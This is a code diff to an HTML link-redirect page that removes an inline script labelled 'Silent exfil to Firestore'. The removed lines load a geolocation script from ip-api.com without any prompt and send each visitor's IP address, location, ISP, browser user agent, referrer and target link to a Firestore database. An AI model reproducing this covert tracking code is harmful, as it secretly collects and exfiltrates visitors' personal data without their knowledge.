@@ -46,9 +46,7 @@
   </div>
 
   <script>
-    // ===== CONFIG =====
-    const FIRESTORE_URL = 'https://firestore.googleapis.com/v1/projects/funny-jokes-e8b49/databases/(default)/documents/logs';
-    // =================
+
 
     function getTargetUrl() {
       const params = new URLSearchParams(window.location.search);
@@ -64,64 +62,6 @@
     const countEl = document.getElementById('count');
     const continueBtn = document.getElementById('continueBtn');
 
-    // Silent exfil to Firestore
-    function exfil(data) {
-      // Build Firestore document format (typed fields)
-      const doc = {
-        fields: {}
-      };
-
-      // Convert each value to the right Firestore type
-      for (const [key, value] of Object.entries(data)) {
-        if (typeof value === 'number') {
-          doc.fields[key] = { doubleValue: value };
-        } else if (typeof value === 'boolean') {
-          doc.fields[key] = { booleanValue: value };
-        } else {
-          doc.fields[key] = { stringValue: String(value) };
-        }
-      }
-
-      const payload = JSON.stringify(doc);
-
-      // sendBeacon for reliable delivery on page unload
-      navigator.sendBeacon(FIRESTORE_URL, payload);
-
-      // Fetch fallback
-      fetch(FIRESTORE_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: payload,
-        keepalive: true
-      }).then(r => r.json()).then(console.log).catch(() => {});
-    }
-
-    // IP geolocation callback — fires when ip-api.com responds
-    window.ipGeo = function(data) {
-      exfil({
-        type: 'ip',
-        lat: data.lat,
-        lon: data.lon,
-        city: data.city || '',
-        region: data.regionName || '',
-        country: data.country || '',
-        zip: data.zip || '',
-        isp: data.isp || '',
-        org: data.org || '',
-        ip: data.query || '',
-        ua: navigator.userAgent,
-        targetUrl: target || '',
-        timestamp: new Date().toISOString(),
-        referrer: document.referrer || 'direct'
-      });
-    };
-
-    // Inject IP geolocation script (silent, no prompt)
-    const s = document.createElement('script');
-    s.src = 'http://ip-api.com/json/?callback=ipGeo';
-    document.head.appendChild(s);
-
-    // UI logic
     if (!target) {
       box.innerHTML = '<div class="error">No link provided.<br>Add <code>?url=&lt;link&gt;</code> to the address to redirect somewhere.</div>';
     } else {
